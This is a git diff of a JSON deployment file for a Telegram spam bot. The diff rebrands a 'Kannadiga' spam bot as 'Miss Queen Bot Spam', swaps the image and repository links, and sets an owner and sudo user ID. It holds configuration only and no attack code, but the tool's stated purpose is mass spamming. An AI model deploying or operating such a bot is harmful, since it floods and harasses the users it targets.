@@ -1,7 +1,7 @@
 {
-    "name": "Kannadiga Robot Spam Bot",
-    "description": "MOST POWERFULL SPAMMING BOT MADE BY KANNADIGA",
-    "logo": "https://te.legra.ph/file/bc756c9f0f5240ce42160.jpg",
+    "name": "𝗠𝗶𝘀𝘀 𝗤𝘂𝗲𝗲𝗻 𝗕𝗼𝘁 𝗦𝗽𝗮𝗺",
+    "description": "MOST POWERFULL SPAMMING BOT MADE BY Mr StonedLegend",
+    "logo": "https://telegra.ph/file/e19ba5f20ce63ebe35d55.jpg",
     "keywords": [
         "telegram",
         "telethon",
@@ -9,7 +9,7 @@
         "Mr-Kannadiga",
         "SpamBot"
     ],
-    "repository": "https://github.com/MR-KANNADIGA/ROBOTSPAM",
+    "repository": "https://github.com/DANGEROUSFIGHTERS/MISS-QUEEN-SPAM",
     "website": "https://t.me/MR_PROFESSOR_AGORA",
     "success_url": "https://github.com/MR-KANNADIGA/ROBOTSPAM",
     "env": {
@@ -20,7 +20,7 @@
       },
       "ALIVE_PIC": {
         "description": "Telegraph Link Of Photo/Video",
-        "value": "https://telegra.ph/file/d336651ca60a7a122f524.jpg",
+        "value": "https://telegra.ph/file/e19ba5f20ce63ebe35d55.jpg",
         "required": false
       },
       "API_HASH": {
@@ -85,12 +85,12 @@
       },
        "SUDO_USER": {
             "description": "Sudo User ID",
-            "value": "",
+            "value": "5201305448",
             "required": false
         },
       "OWNER_ID": {
             "description": "OWNER ID",
-            "value": "",
+            "value": "5201305448",
             "required": true
         },
         "HEROKU_API_KEY": {
